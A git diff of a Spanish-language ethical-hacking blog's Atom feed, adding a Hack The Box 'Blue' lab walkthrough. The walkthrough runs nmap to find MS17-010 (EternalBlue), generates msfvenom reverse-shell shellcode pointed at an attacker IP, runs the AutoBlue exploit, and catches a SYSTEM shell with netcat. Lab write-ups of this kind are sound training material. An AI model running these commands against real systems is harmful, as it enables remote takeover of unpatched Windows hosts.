@@ -1,4 +1,233 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-10-19T21:56:02-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">K4miyo | Ciberseguridad!</title><subtitle>Artículos relacinados al hacking ético en diferentes plataformas</subtitle><author><name>K4miyo</name></author><entry><title type="html">Hack The Box Kotarak</title><link href="http://localhost:4000/htb-kotarak/" rel="alternate" type="text/html" title="Hack The Box Kotarak" /><published>2021-10-19T00:00:00-05:00</published><updated>2021-10-19T00:00:00-05:00</updated><id>http://localhost:4000/htb-kotarak</id><content type="html" xml:base="http://localhost:4000/htb-kotarak/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-kotarak/banner-kotarak.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-10-30T19:19:28-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">K4miyo | Ciberseguridad!</title><subtitle>Artículos relacinados al hacking ético en diferentes plataformas</subtitle><author><name>K4miyo</name></author><entry><title type="html">Hack The Box Blue</title><link href="http://localhost:4000/htb-blue/" rel="alternate" type="text/html" title="Hack The Box Blue" /><published>2021-10-30T00:00:00-05:00</published><updated>2021-10-30T00:00:00-05:00</updated><id>http://localhost:4000/htb-blue</id><content type="html" xml:base="http://localhost:4000/htb-blue/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-blue/banner-blue.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;blue&quot;&gt;Blue&lt;/h2&gt;
+&lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.40.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.10.40
+PING 10.10.10.40 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.40&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
+64 bytes from 10.10.10.40: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;127 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;144 ms
+
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 10.10.10.40 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
+1 packets transmitted, 1 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;0ms
+rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 144.246/144.246/144.246/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Windows. A continuación se procede con la ejecución de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; para determinar los puertos abiertos de la máquina y exportanto la información al archivo &lt;strong&gt;allPorts&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.10.40 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts
+Host discovery disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; All addresses will be marked &lt;span class=&quot;s1&quot;&gt;'up'&lt;/span&gt; and scan &lt;span class=&quot;nb&quot;&gt;times &lt;/span&gt;may be slower.
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-09-16 21:40 CDT
+Initiating SYN Stealth Scan at 21:40
+Scanning 10.10.10.40 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]
+Discovered open port 135/tcp on 10.10.10.40
+Discovered open port 445/tcp on 10.10.10.40
+Discovered open port 139/tcp on 10.10.10.40
+Discovered open port 49152/tcp on 10.10.10.40
+Discovered open port 49153/tcp on 10.10.10.40
+Discovered open port 49157/tcp on 10.10.10.40
+Discovered open port 49155/tcp on 10.10.10.40
+Discovered open port 49156/tcp on 10.10.10.40
+Discovered open port 49154/tcp on 10.10.10.40
+Completed SYN Stealth Scan at 21:41, 30.60s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.40
+Host is up, received user-set &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.21s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Scanned at 2021-09-16 21:40:49 CDT &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;30s
+Not shown: 63970 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 1556 filtered tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;no-response&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Some closed ports may be reported as filtered due to &lt;span class=&quot;nt&quot;&gt;--defeat-rst-ratelimit&lt;/span&gt;
+PORT      STATE SERVICE      REASON
+135/tcp   open  msrpc        syn-ack ttl 127
+139/tcp   open  netbios-ssn  syn-ack ttl 127
+445/tcp   open  microsoft-ds syn-ack ttl 127
+49152/tcp open  unknown      syn-ack ttl 127
+49153/tcp open  unknown      syn-ack ttl 127
+49154/tcp open  unknown      syn-ack ttl 127
+49155/tcp open  unknown      syn-ack ttl 127
+49156/tcp open  unknown      syn-ack ttl 127
+49157/tcp open  unknown      syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;30.98 seconds
+           Raw packets sent: 150431 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;6.619MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 75540 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3.022MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Mediante la función &lt;a href=&quot;/extractPorts&quot;&gt;extractPorts&lt;/a&gt; definida a nivel de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zsh&lt;/code&gt; , se obtiene la información más relevante de la captura grepeable.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ extractPorts allPorts
+───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ 
+   2   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Extracting information...
+   3   │ 
+   4   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; IP Address: 10.10.10.40
+   5   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Open ports: 135,139,445,49152,49153,49154,49155,49156,49157
+   6   │ 
+   7   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Ports copied to clipboard
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p135&lt;/span&gt;,139,445,49152,49153,49154,49155,49156,49157 10.10.10.40 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; targeted
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-09-16 21:42 CDT
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.40
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+
+PORT      STATE SERVICE      VERSION
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+49152/tcp open  msrpc        Microsoft Windows RPC
+49153/tcp open  msrpc        Microsoft Windows RPC
+49154/tcp open  msrpc        Microsoft Windows RPC
+49155/tcp open  msrpc        Microsoft Windows RPC
+49156/tcp open  msrpc        Microsoft Windows RPC
+49157/tcp open  msrpc        Microsoft Windows RPC
+Service Info: Host: HARIS-PC&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; OS: Windows&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;dangerous, but default&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| smb2-time: 
+|   &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;: 2021-09-17T02:48:03
+|_  start_date: 2021-09-17T02:42:45
+| smb2-security-mode: 
+|   2.1: 
+|_    Message signing enabled but not required
+| smb-os-discovery: 
+|   OS: Windows 7 Professional 7601 Service Pack 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Windows 7 Professional 6.1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
+|   Computer name: haris-PC
+|   NetBIOS computer name: HARIS-PC&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;00
+|   Workgroup: WORKGROUP&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;00
+|_  System &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 2021-09-17T03:48:01+01:00
+|_clock-skew: mean: &lt;span class=&quot;nt&quot;&gt;-15m13s&lt;/span&gt;, deviation: 34m37s, median: 4m45s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;75.70 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Observamos que se encuentra abierto el puerto 445 asociado al servicio de SMB; por lo que podríamos tirar un escaneo &lt;em&gt;“vuln and safe”&lt;/em&gt; sobre &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; para determinar si puede ser vulnerable al &lt;strong&gt;Eternal Blue&lt;/strong&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;vuln and safe&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p445&lt;/span&gt; 10.10.10.40 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; smbScan
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-09-16 21:46 CDT
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.40
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Host script results:
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;Microsoft SMBv1 servers &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ms17-010&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk &lt;span class=&quot;nb&quot;&gt;factor&lt;/span&gt;: HIGH
+|       A critical remote code execution vulnerability exists &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;Microsoft SMBv1
+|        servers &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ms17-010&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+|           
+|     Disclosure &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;: 2017-03-14
+|     References:
+|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;CVE-2017-0143
+|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;4.46 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;De acuerdo con los resultados observados, vemos que es vulnerable al &lt;strong&gt;ms17-010&lt;/strong&gt; y además sabemos que la máquina tiene &lt;em&gt;Windows 7 Professional 7601 Service Pack 1&lt;/em&gt;; entonces ya sabemos que descargamos el exploit correspondiente.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/3ndG4me/AutoBlue-MS17-010&quot;&gt;AutoBlue-MS17-010&lt;/a&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ git clone https://github.com/3ndG4me/AutoBlue-MS17-010
+Clonando en &lt;span class=&quot;s1&quot;&gt;'AutoBlue-MS17-010'&lt;/span&gt;...
+remote: Enumerating objects: 126, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+remote: Counting objects: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;50/50&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+remote: Compressing objects: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;15/15&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+remote: Total 126 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;delta 40&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, reused 35 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;delta 35&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, pack-reused 76
+Recibiendo objetos: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;126/126&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 94.22 KiB | 1015.00 KiB/s, listo.
+Resolviendo deltas: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;74/74&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, listo.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Una vez descargado, ingresamos a la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AutoBlue-MS17-010/shellcode&lt;/code&gt; para generar el shellcode correspondiente mediante la ejecucion del archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shell_prep.sh&lt;/code&gt; e ingresamos los datos que nos va solicitando:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ./shell_prep.sh         
+                 _.-&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;-._ 
+          &lt;span class=&quot;s1&quot;&gt;'-..-'&lt;/span&gt;|   &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;   |
+          &lt;span class=&quot;s1&quot;&gt;'-..-'&lt;/span&gt;|_.-&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;-._|   
+          &lt;span class=&quot;s1&quot;&gt;'-..-'&lt;/span&gt;|   &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;   |                                      
+          &lt;span class=&quot;s1&quot;&gt;'-..-'&lt;/span&gt;|_.-&lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;-._|   
+Eternal Blue Windows Shellcode Compiler
+
+Let&lt;span class=&quot;s1&quot;&gt;'s compile them windoos shellcodezzz
+                                
+Compiling x64 kernel shellcode                                                                                                   
+Compiling x86 kernel shellcode
+kernel shellcode compiled, would you like to auto generate a reverse shell with msfvenom? (Y/n)
+y         
+LHOST for reverse connection:                                   
+10.10.14.2
+LPORT you want x64 to listen on: 
+443 
+LPORT you want x86 to listen on:                                                                                                 
+4443
+Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell
+1
+Type 0 to generate a staged payload or 1 to generate a stageless payload
+1
+Generating x64 cmd shell (stageless)...                                                                                          
+                                                                                                                                 
+msfvenom -p windows/x64/shell_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=10.10.14.2 LPORT=443
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Saved as: sc_x64_msf.bin                                        
+
+Generating x86 cmd shell (stageless)...                                                                                          
+                                                                                                                                 
+msfvenom -p windows/shell_reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=10.10.14.2 LPORT=4443
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Saved as: sc_x86_msf.bin  
+                                
+MERGING SHELLCODE WOOOO!!!
+DONE
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahora dentro del directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AutoBlue-MS17-010/&lt;/code&gt; ejecutamos el programa &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eternalblue_exploit7.py&lt;/code&gt; pasandole de argumentos la dirección IP víctima &lt;em&gt;10.10.10.40&lt;/em&gt; y el shellcode &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shellcode/sc_x64.bin&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ python2 eternalblue_exploit7.py 10.10.10.40 shellcode/sc_x64.bin
+shellcode size: 1232
+numGroomConn: 13
+Target OS: Windows 7 Professional 7601 Service Pack 1
+SMB1 session setup allocate nonpaged pool success
+SMB1 session setup allocate nonpaged pool success
+good response status: INVALID_PARAMETER
+&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Al mismo tiempo, nos ponemos en escucha por el puerto 443 y esperamos que se establezca la conexión:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ rlwrap nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 443
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
+connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.2] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.40] 49158
+Microsoft Windows &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Version 6.1.7601]
+Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2009 Microsoft Corporation.  All rights reserved.
+
+&lt;span class=&quot;nb&quot;&gt;whoami
+whoami
+&lt;/span&gt;nt authority&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem
+
+C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;A este punto ya ingresamos a la máquina como &lt;strong&gt;nt authority\system&lt;/strong&gt; y podemos visualizar las flags (user.txt y root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="Windows" /><category term="Patch_Management" /><summary type="html">Resolución de la máquina Blue en la plataforma de Hack The Box</summary></entry><entry><title type="html">Hack The Box Kotarak</title><link href="http://localhost:4000/htb-kotarak/" rel="alternate" type="text/html" title="Hack The Box Kotarak" /><published>2021-10-19T00:00:00-05:00</published><updated>2021-10-19T00:00:00-05:00</updated><id>http://localhost:4000/htb-kotarak</id><content type="html" xml:base="http://localhost:4000/htb-kotarak/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-kotarak/banner-kotarak.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;kotarak&quot;&gt;Kotarak&lt;/h2&gt;
 &lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.55.&lt;/p&gt;
@@ -6290,469 +6519,4 @@ Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;C&lt;span class=&quot;o&
 PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;A partir de este punto ya podemos visualizar las flags (user.txt y root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="Windows" /><category term="PHP" /><category term="Log_Poisoning" /><category term="Powershell" /><summary type="html">Resolución de la máquina Bart en la plataforma de Hack The Box</summary></entry><entry><title type="html">Hack The Box DevOops</title><link href="http://localhost:4000/htb-devoops/" rel="alternate" type="text/html" title="Hack The Box DevOops" /><published>2021-10-05T00:00:00-05:00</published><updated>2021-10-05T00:00:00-05:00</updated><id>http://localhost:4000/htb-devoops</id><content type="html" xml:base="http://localhost:4000/htb-devoops/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-devoops/banner-devoops.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;devoops&quot;&gt;DevOops&lt;/h2&gt;
-&lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.91.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.10.91
-PING 10.10.10.91 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.91&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
-64 bytes from 10.10.10.91: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;63 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;136 ms
-
-&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 10.10.10.91 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
-1 packets transmitted, 1 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;0ms
-rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 136.314/136.314/136.314/0.000 ms
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; para determinar los puertos abiertos de la máquina y exportanto la información al archivo &lt;strong&gt;allPorts&lt;/strong&gt;.&lt;/p&gt;
-
